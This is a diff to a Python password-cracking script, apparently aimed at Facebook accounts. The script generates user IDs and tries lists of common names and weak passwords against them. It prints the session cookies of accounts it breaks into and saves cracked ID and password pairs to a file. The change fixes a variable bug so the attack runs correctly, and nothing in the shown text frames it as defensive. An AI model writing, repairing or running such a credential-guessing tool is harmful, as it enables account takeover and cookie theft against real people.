@@ -224,7 +224,7 @@ def v3():
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
-            yaari.submit(rcrack1,cid,pwx,tl)
+            yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
     print(' [♥] Ids saved in ok.txt,cp.txt')
@@ -282,15 +282,15 @@ def rcrack1(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\033[38;5;46m[SHANTO-OK🌻] {cid}|{ps}")
+                    print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
                     print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SHANTO-CP❌] {cid}|{ps}")
-                open('/sdcard/SHANTO-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
+                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
